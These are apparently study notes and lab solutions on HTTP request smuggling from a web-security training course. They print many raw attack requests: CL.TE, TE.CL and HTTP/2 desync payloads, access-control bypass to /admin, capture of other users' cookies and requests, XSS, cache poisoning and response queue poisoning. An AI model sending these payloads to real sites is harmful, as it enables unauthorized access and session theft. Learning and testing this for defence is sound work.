# HTTP request smuggling
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users  
Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.   
attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request.  
Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.  
The Content-Length header is straightforward: it specifies the length of the message body in bytes  
The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents.  
As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored  
Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:  
* CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
* TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 
* TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.  
Transfer-Encoding: chunked
## CL.TE vulnerabilities
Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can perform a simple HTTP request smuggling attack as follows:  
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. This request is forwarded on to the back-end server  
The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.  
`HTTP Request SMuggler` extension will help to count COntent-Length automatically  
```
POST / HTTP/1.1
Content-Length: 31
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Ortigin:
```
Here we are smuggling additional request (GPOST)

## TE.CL vulnerabilities
Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows: 
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
 To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence \r\n\r\n following the final 0.  
The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.  
The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.  
```
Content-Length: 4

65
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0


```
## TE.TE behavior: obfuscating the TE header
 Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example: 
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
Lab solution:
```
POST / HTTP/1.1
Host: 0a2d00ff037899c8c17fc88600cc00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

65
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0

```
## Finding HTTP request smuggling vulnerabilities using timing techniques
The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.  
### Finding CL.TE vulnerabilities using timing techniques
Such request must cause delay:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.  
### Finding TE.CL vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.  
To be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.  
## Confirming HTTP request smuggling vulnerabilities using differential responses
To confirm vulnerability we must quickly send attack and normal request  
If the response to the normal request contains the expected interference, then the vulnerability is confirmed.  
### Confirming CL.TE vulnerabilities using differential responses
Attack request:
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
Last two lines must be treated as belonging to next normal request  
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: x
```
## Confirming TE.CL vulnerabilities using differential responses
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```
If the attack is successful, then everything from GET /404 onwards is treated by the back-end server as belonging to the next request that is received  
```
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

a7
GET /404 HTTP/1.1
Host: 0aa8008603dfb20dc1821ccb00080051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

smuggled=yes
0

```
The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.  

## Using HTTP request smuggling to bypass front-end security controls
In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.  
Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack: 

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. However, the back-end server sees one request for /home and one request for /admin. It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL.  
Sometimes we will need to bypass error caused by couple of Host headers in request (for example when we are trying to access admin panel and set additional Host header which equals to localhost). In such case we will need to add additional empty parameter and issue request twice in order to append second smuggled request to first one  
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
Don't forget to add Content-Type and Content-Length in such case  

## Revealing front-end request rewriting
In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might: 
* terminate the TLS connection and add some headers describing the protocol and ciphers that were used; 
* add an X-Forwarded-For header containing the user's IP address; 
* determine the user's ID based on their session token and add a header identifying the user;
* add some sensitive information that is of interest for other attacks.
to reveal exactly how the front-end server is rewriting requests:
* Find a POST request that reflects the value of a request parameter into the application's response
* Shuffle the parameters so that the reflected parameter appears last in the message body
* Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal
Suppose an application has a login function that reflects the value of the email parameter: 
```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```
 This results in a response containing the following: 
 ```
 <input id="email" value="wiener@normal-user.net" type="text">
 ```
Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```
The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter. It will then reflect this value back in the response to the second request: 
```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```
Since the final request is being rewritten, you don't know how long it will end up. The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.  
Once you have revealed how the front-end server is rewriting requests, you can apply the necessary rewrites to your smuggled requests, to ensure they are processed in the intended way by the back-end server.   

## Bypassing client authentication
If frontend appends some simple headers for user authentication, we possibly can override them with request smuggling. We discover front-end headers as explained in previous section and in next smuggled request we are overriding them:
```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```
## Capturing other users' requests
If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.  
To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request. For example, suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog: 
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```
Next we can smuggle request with `comment=` placed in last position and extra long content-length:
```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```
The Content-Length header of the smuggled request indicates that the body will be 400 bytes long, but we've only sent 144 bytes. In this case, the back-end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough. As a result, when another request is sent to the back-end server down the same connection, the first 256 bytes are effectively appended to the smuggled request  
One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the & character, meaning that the content that is stored from the victim user's request will end at the first &, which might even appear in the query string  

## Using HTTP request smuggling to exploit reflected XSS
If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application.
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

## Using HTTP request smuggling to turn an on-site redirect into an open redirect
Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash: 
```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
exploitation:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
### Turning root-relative redirects into open redirects
In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the Location header, for example: 
```
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```
This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path: 
```
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```
## Using HTTP request smuggling to perform web cache poisoning
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```
The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is /static/include.js: 
```
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
## Using HTTP request smuggling to perform web cache deception
In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.  
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```
## HTTP/2 request smuggling
HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths.  
n theory, this mechanism means there is no opportunity for an attacker to introduce the ambiguity required for request smuggling, as long as the website uses HTTP/2 end to end. In the wild, however, this is often not the case due to the widespread but dangerous practice of HTTP/2 downgrading.  
HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1.  
## H2.CL vulnerabilities
HTTP/2 requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 Content-Length header  
HTTP/2 requests can also include their own content-length header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.  
It may be possible to smuggle requests by injecting a misleading content-length header.  
We need to enable feature `Allow HTTP/2 ALPN override` in Repeater  
If backend uses Content-Length to verify request, we disable "update content length" option in burp and simply appen additional request:
```
POST / HTTP/2
Host: 0a42003e03d51d61c02d0feb00e80099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404pls HTTP/1.1
Host: 0a42003e03d51d61c02d0feb00e80099.web-security-academy.net
Content-Length: 25

smuggled=yes
```

## H2.TE vulnerabilities
Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any transfer-encoding: chunked header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.  
```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```
## Request smuggling via CRLF injection
Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.  
In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (\n) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.  
```
Foo: bar\nTransfer-Encoding: chunked
```
This discrepancy doesn't exist with the handling of a full CRLF (\r\n) sequence because all HTTP/1 servers agree that this terminates the header.  
On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that \r\n no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split: 
```
foo: bar\r\nTransfer-Encoding: chunked
```
This header must be added manually via Inspector
This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the \r\n will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers: 
```
Foo: bar
Transfer-Encoding: chunked
```
If we detect any functionality which receives and returns text (rtecently searched items, comments etc.) we can use CRLF injection in combination with big Content-Length in order to steal user's cookies  
```
POST / HTTP/2
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
foo: bar\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Cookie: session=g5VS4PaNaMcMZ1uI02pCFquZaqDzxPW4; _lab_analytics=WKesnTTuo8aqDwQZi1tet4JIbNutweZ7odsZVzSSLjPiagwKcmsIKJMVDq0UPBXuGn04iuFmgisVdmi9vBegM8v0V072K5R4dZhnMwSyZFyJ2UKw5wgMVsMb4VAehnlg2thHlf4WqEXcOVZcmH0HkTilNqh4DLOwpikt9VGEAiRR4L24jChh4282BHUaiKZWY5pGPKXbyEJrPfHedNvv50yDmjm6pbAgZreZJCkCM7nB9IAddhomuaPrF8vY5E1o
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

search=
```
## HTTP/2 request splitting
when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers  
```
:method 	GET
:path 	/
:authority 	vulnerable-website.com
foo 	

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```
## Accounting for front-end rewriting
To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.  
For example, you need to ensure that both requests received by the back-end contain a Host header. Front-end servers typically strip the :authority pseudo-header and replace it with a new HTTP/1 Host header during downgrading. There are different approaches for doing this, which can influence where you need to position the Host header that you're injecting.  
To test it. we simply add a header via Inspector like this:
```
foo: bar\r\n
\r\n
GET /404pls HTTP/1.1
Host: 0ae300fd0394e2578008ef9700b2003f.web-security-academy.net
```
If second request returns 404, we are successful
## Supplying an ambiguous path
Modify headers via Inspector:
```
:method 	POST
:path 	/anything
:path 	/admin
:authority 	vulnerable-website.com
```
## Injecting a full request line
```
:method 	GET /admin HTTP/1.1
:path 	/anything
:authority 	vulnerable-website.com
```
## Response queue poisoning
Response queue poisoning is a powerful form of request smuggling attack that causes a front-end server to start mapping responses from the back-end to the wrong requests. In practice, this means that all users of the same front-end/back-end connection are persistently served responses that were intended for someone else.  
For a successful response queue poisoning attack, the following criteria must be met:
* The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles. 
* The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server. 
* The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end.  

If you instead smuggle a request that also contains a body, the next request on the connection will be appended to the body of the smuggled request. This often has the side-effect of truncating the final request based on the apparent Content-Length. As a result, the back-end effectively sees three requests, where the third "request" is just a series of leftover bytes: 
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: v`ulnerable-website.com`
```
All afteer "v" is considered as leftover bytes and oftenlyc auses an error  
With a bit of care, you can smuggle a complete request instead of just a prefix. As long as you send exactly two requests in one, any subsequent requests on the connection will remain unchanged: 
```
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```
Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response.  
An attacker can continue to steal responses like this for as long as the front-end/back-end connection remains open. Exactly when a connection is closed differs from server to server, but a common default is to terminate a connection after it has handled 100 requests. It's also trivial to repoison a new connection once the current one is closed.  
## Browser-powered request smuggling
## CL.0 request smuggling
In some instances, servers can be persuaded to ignore the Content-Length header, meaning they assume that each request finishes at the end of the headers. This is effectively the same as treating the Content-Length as 0.  
## Testing for CL.0 vulnerabilities
To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.  
```
POST /vulnerable-endpoint HTTP/1.1 
Host: vulnerable-website.com 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 34 
GET /hopefully404 HTTP/1.1 
Foo: x
GET / HTTP/1.1 
Host: vulnerable-website.com
```
change the send mode to Send group in sequence (single connection).  

Change the Connection header to keep-alive.  
mostly observed this behavior on endpoints that simply aren't expecting POST requests, so they implicitly assume that no requests have a body. Endpoints that trigger server-level redirects and requests for static files are prime candidates.  
So if main page isn't vulnerable, t ry to exploit some /resources/ files for example  
## H2.0 vulnerabilities
Websites that downgrade HTTP/2 requests to HTTP/1 may be vulnerable to an equivalent "H2.0" issue if the back-end server ignores the Content-Length header of the downgraded request.  

## Client-side desync attack
A client-side desync (CSD) is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website. This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server.  
 Web servers can sometimes be encouraged to respond to POST requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a client-side desync vulnerability.

In high-level terms, a CSD attack involves the following stages: 

* The victim visits a web page on an arbitrary domain containing malicious JavaScript.
* The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
* The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
* The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.
The first step in testing for client-side desync vulnerabilities is to identify or craft a request that causes the server to ignore the Content-Length header. The simplest way to probe for this behavior is by sending a request in which the specified Content-Length is longer than the actual body  
If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.  
It's a hard topic, more [here](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync) and [here](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync)  
